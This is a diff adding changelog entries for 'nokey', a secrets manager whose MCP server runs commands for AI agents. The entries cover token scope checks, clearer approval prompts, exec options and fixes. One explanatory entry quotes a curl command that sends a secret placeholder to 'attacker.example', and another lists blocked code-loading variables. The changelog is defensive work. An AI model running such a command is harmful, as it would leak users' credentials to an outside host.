@@ -76,8 +76,70 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `net/http`, `net/textproto`, `crypto/tls` and `html/template`
   (GO-2026-6599 through GO-2026-6617), and govulncheck finds them
   reachable from the proxy, OAuth and 1Password Connect code paths.
+- A token's `for` scope is now enforced. `mint_token` has always accepted
+  `for` ("Command pattern this token is for") and `list_tokens` shows it,
+  but nothing ever checked it: a token minted `for: gh` was accepted by
+  `exec` and `exec_with_secrets` for any command, and by the GitHub
+  integration tools. The pattern is now matched against the command's
+  base name the same way policy rules are, and a mismatch is rejected
+  with `token invalid: wrong_command`, naming the token's pattern and
+  the command, without consuming a use. Tokens minted with the default
+  `*`, including auto-minted session tokens, behave exactly as before.
+  **Behaviour change for scoped tokens:** the GitHub integration tools
+  are checked as `nokey:integration:github`, so a token minted
+  `for: gh` that used to work with `github_api` and the other `github_*`
+  tools is now refused. Mint it `for: nokey:integration:github` (or
+  `*`) instead.
+- Approval prompts now show what is being approved, not just a command
+  name. `exec` and `exec_with_secrets` list the arguments (quoted, with
+  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes with
+  a note of how many bytes and arguments were cut), so
+  `curl https://attacker.example -H "X: ${{NOKEY:KEY}}"` no longer reads
+  as a plain "curl wants KEY". `mint_token` shows the requested `for`,
+  TTL and max uses, the auto-minted session token is described as
+  "unlimited uses, 1h, any command", and integration tools show the
+  request method, path and body. Every model-supplied value in a prompt is
+  quoted and capped, so a newline in it can't forge a line of the
+  prompt.
+- `mint_token` validates the TTL, `max_uses`, the `for` pattern and that
+  every named secret exists before prompting, and `exec_with_secrets`
+  checks its placeholder secrets exist before prompting, so the user is
+  never asked to approve a request that is going to fail.
+- `revoke_token` records a short SHA-256 fingerprint of the token ID in
+  the audit log instead of the ID itself.
 
 ### Added
+- `nokey mcp serve` sends server instructions at initialize: call
+  `list_secrets` first, prefer `exec_with_secrets` placeholders over
+  `exec`'s environment injection, how approval prompts and `mint_token`
+  fit in, and the policy command name the GitHub tools are checked
+  against.
+- The MCP server recovers from a panic in a tool handler and returns it
+  as an error for that call, instead of exiting and dropping the
+  session.
+- `exec` and `exec_with_secrets` take four optional parameters: `cwd`
+  (an absolute, existing directory to run in; the command must then be
+  a bare name or an absolute path), `stdin` (text fed to the command,
+  which otherwise still gets none), `env` (extra non-secret variables;
+  stored secret names are rejected, since their values would not be
+  redacted, as are variables that change what code a program loads or
+  runs, such as `PATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `NODE_OPTIONS`,
+  `PYTHON*` and `GIT_SSH*`) and `separate_stderr` (stderr returned after
+  stdout under a `[stderr]` line, each stream redacted separately and
+  given half of the 1 MiB output limit). When any of them is set, the approval prompt shows the
+  cwd, the env entries and a preview of stdin. Leaving them out runs
+  exactly as before.
+- `exec` and `exec_with_secrets` declare an output schema and return
+  structured content next to their unchanged text: `output`, `stderr`
+  (when split), `exit_code`, `timed_out`, `truncated`, `original_bytes`
+  and `secrets_injected`. Clients that read structured results no longer
+  have to parse the `[exit code: N]` prefix or guess whether output was
+  cut.
+- `github_list_issues` and `github_list_prs` take an optional `page`, so
+  results past the first page are reachable without falling back to
+  `github_api`. `github_get_file` takes an optional `raw` that returns
+  the file's contents directly instead of JSON metadata with
+  base64-encoded content.
 - `nokey import --dry-run FILE` parses the file and lists the secret
   names it would import, flagging any the keyring would reject, without
   opening the keyring or writing anything.
@@ -108,6 +170,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   hint, which opened the keyring on every Tab press.
 
 ### Changed
+- Every MCP tool now has a title and annotation hints that match what it
+  does. mcp-go defaults a tool with no annotations to destructive and
+  open-world, so clients showed all six GitHub tools, `mint_token` and
+  the proxy tools as destructive, and `list_secrets`/`list_tokens` as
+  reaching the outside world. The read-only GitHub tools are now marked
+  read-only, the create tools and `mint_token` non-destructive, the proxy
+  tools and `revoke_token` idempotent, and only `exec`,
+  `exec_with_secrets` and `github_api` keep the destructive default.
 - `nokey status` validates `config.yaml` strictly, so a file with an
   unknown (for example misspelled) key is now reported as
   `config: error: ...` rather than `valid`, even though the rest of
@@ -118,6 +188,25 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   only when it is present, and the redacting reader reuses its read
   buffer. On a 64 KiB chunk with four secrets this goes from 2.4 MB and
   65 allocations to none, and runs about 1.8x faster.
+- MCP errors now say how to get past them. A policy denial from `exec`,
+  `exec_with_secrets` or a GitHub tool is followed by the rule the user
+  could add and the path of `policies.yaml`; the token-required error
+  names the `mint_token` secrets and `for` value to use; and the
+  only/except conflict no longer refers to `--only`/`--except` flags
+  that MCP callers don't have. Each message still starts with the same
+  words (`policy denied:`, `token required by policy`, `cannot use
+  both`), and policy denials are audited as before.
+- The policy command name the MCP GitHub tools are checked under,
+  `nokey:integration:github`, is now documented in the README, the
+  `nokey init` starter policy and `examples/policies.yaml` (as a
+  commented-out rule, so new policies behave as before). Until now it
+  appeared only in the roadmap, so any `policies.yaml` quietly disabled
+  the GitHub tools.
+- The README's MCP setup and `nokey mcp --help` now use
+  `claude mcp add` / `.mcp.json` instead of the
+  `~/.claude/claude_code_config.json` file current Claude Code no longer
+  reads, and the help describes the policy, approval and token gates
+  rather than only the keyring ACL.
 
 ### Fixed
 - `nokey proxy` and `--isolate` shutdown can no longer hang. A client
@@ -176,6 +265,38 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   removed.
   That includes the fixed `chain_head.json.tmp` an older nokey uses, so
   an older version still running alongside can have its save fail.
+- `exec` no longer drops its arguments. The tool schema declares `args`
+  as a string holding a JSON array, which is what schema-following
+  clients send, but the handler only read a native array and treated a
+  string as no arguments at all, so `{"command": "echo", "args":
+  "[\"hi\"]"}` ran a bare `echo`. Both exec tools now accept either
+  form and reject a string that isn't a JSON array of strings.
+- MCP exec timeouts are reported as timeouts, and actually end the run.
+  A child killed at the deadline surfaces as an exit error, so the
+  "timed out" branch was unreachable and a timeout came back as
+  `[exit code: -1]`. Worse, a background process that inherited the
+  output pipe (`sh -c "server & …"`) kept the read open after the kill,
+  so the call blocked until that process exited, regardless of
+  `timeout_seconds`. Commands now run in their own process group, which
+  is killed as a whole at the deadline (on Windows the direct child is
+  killed and the wait is bounded), and the result is an error with the
+  same `command timed out after N seconds` message followed by whatever
+  output was produced, redacted. A command that exits normally but
+  leaves a background process holding its output returns its output and
+  exit code once the two-second wait for that process runs out. A
+  `timeout_seconds` above 300 now says it was clamped.
+- MCP exec no longer buffers unbounded output. The whole of a command's
+  output was held in memory and only cut to 1 MiB afterwards, so a
+  chatty or hostile command could grow the long-lived `nokey mcp serve`
+  process without limit. Output is now capped as it arrives, just past
+  1 MiB so a secret straddling the limit is still redacted whole, and
+  the raw buffer is zeroed once redacted. Output under the limit is
+  returned byte-for-byte as before; longer output is still a redacted
+  prefix ending in `[output truncated]`, though when redaction shortens
+  it the prefix can now be shorter than 1 MiB.
+- When an MCP `exec` command times out or can't be started, the audit
+  entry now names the secrets that were injected, as `exec_with_secrets`
+  and every successful run already did, instead of recording `all`.
 - Parallel MCP tool calls no longer race on the handler's session state.
   mcp-go runs tool calls on a pool of five workers, but the proxy handle
   and the auto-minted session token were unguarded fields. A burst of
